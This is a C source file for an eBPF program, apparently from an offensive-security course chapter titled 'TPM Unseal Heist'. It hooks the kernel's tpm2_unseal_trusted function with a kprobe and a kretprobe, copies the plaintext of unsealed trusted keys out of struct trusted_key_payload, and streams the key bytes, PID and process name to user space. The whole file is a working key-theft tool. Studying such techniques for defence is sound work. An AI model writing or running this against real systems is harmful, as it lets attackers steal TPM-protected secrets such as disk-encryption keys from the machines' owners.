// ch23 TPM Unseal Heist — kernel-side BPF program.
// kprobe on tpm2_unseal_trusted saves the payload pointer;
// kretprobe reads key bytes from struct trusted_key_payload->key[].
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

char LICENSE[] SEC("license") = "GPL";

#define MAX_KEY_LEN 128

struct evt {
    __u32 pid;
    __u32 key_len;
    __u8  key_bytes[MAX_KEY_LEN];
    char  comm[16];
};

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 1 << 20);
} events SEC(".maps");

/* Store the payload pointer across kprobe/kretprobe pair */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 256);
    __type(key, __u32);   /* pid */
    __type(value, __u64); /* ptr to trusted_key_payload */
} inflight SEC(".maps");

SEC("kprobe/tpm2_unseal_trusted")
int BPF_KPROBE(kp_tpm2_unseal_trusted, void *chip, void *payload, void *options)
{
    __u32 pid = bpf_get_current_pid_tgid() & 0xffffffff;
    __u64 ptr = (unsigned long)payload;
    bpf_map_update_elem(&inflight, &pid, &ptr, BPF_ANY);

    /* Emit entry interception proof — fires even if TPM backend fails */
    struct evt *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
    if (!e) return 0;
    e->pid = pid;
    e->key_len = 0; /* 0 = kprobe entry intercept marker */
    bpf_get_current_comm(e->comm, sizeof(e->comm));
    __builtin_memset(e->key_bytes, 0, sizeof(e->key_bytes));
    bpf_ringbuf_submit(e, 0);
    return 0;
}

SEC("kretprobe/tpm2_unseal_trusted")
int BPF_KRETPROBE(krp_tpm2_unseal_trusted, int ret)
{
    __u32 pid = bpf_get_current_pid_tgid() & 0xffffffff;
    __u64 *pptr = bpf_map_lookup_elem(&inflight, &pid);
    if (!pptr) return 0;
    void *payload = (void *)(unsigned long)*pptr;
    bpf_map_delete_elem(&inflight, &pid);

    if (ret != 0) return 0; /* unseal failed — no plaintext */

    /* struct trusted_key_payload (include/keys/trusted-type.h):
     *   struct callback_head rcu;   // 16 bytes on 64-bit
     *   unsigned int key_len;       // <-- the plaintext length
     *   unsigned int blob_len;
     *   unsigned char migratable, old_format;
     *   unsigned char key[MAX_KEY_SIZE + 1];   // <-- the unsealed plaintext
     *   unsigned char blob[...];
     * The struct begins with an rcu_head, so key_len is NOT at offset 0.
     * Use CO-RE so the correct, relocated field offsets are used on any
     * kernel version instead of hard-coding them. */
    struct trusted_key_payload *p = payload;
    __u32 key_len = 0;
    if (bpf_core_read(&key_len, sizeof(key_len), &p->key_len))
        return 0;
    if (key_len == 0 || key_len > MAX_KEY_LEN) return 0;

    struct evt *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
    if (!e) return 0;

    e->pid = pid;
    e->key_len = key_len;
    bpf_get_current_comm(e->comm, sizeof(e->comm));
    __builtin_memset(e->key_bytes, 0, sizeof(e->key_bytes));
    bpf_core_read(e->key_bytes, key_len & (MAX_KEY_LEN - 1), &p->key);

    bpf_ringbuf_submit(e, 0);
    return 0;
}
